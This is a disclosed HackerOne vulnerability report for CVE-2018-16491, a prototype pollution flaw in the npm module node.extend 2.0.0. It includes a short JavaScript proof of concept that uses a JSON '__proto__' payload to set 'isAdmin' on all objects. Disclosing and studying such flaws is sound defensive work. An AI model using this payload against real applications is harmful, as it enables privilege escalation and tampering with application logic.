# [M] Prototype pollution attack in node.extend

## Summary
Severity: Medium (CVSS 5.7)
Program: Node.js third-party modules
Weakness: Uncontrolled Resource Consumption
Reporter: asgerf
State: resolved
Disclosed: 2018-11-30T14:01:57.458Z
CVE: CVE-2018-16491
Source: https://hackerone.com/reports/430831

## Details
I would like to report a prototype pollution vulnerability in node.extend.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** node.extend
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/node.extend`

## Module Description

A port of jQuery.extend that actually works on node.js

## Module Stats

267,701 downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

`node.extend` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
Craft an object of form `{__proto__: {...}}` and send it to `node.extend`:
```javascript
let extend = require('node.extend');
extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N]

_Trimmed to 38 lines — full report: https://hackerone.com/reports/430831_
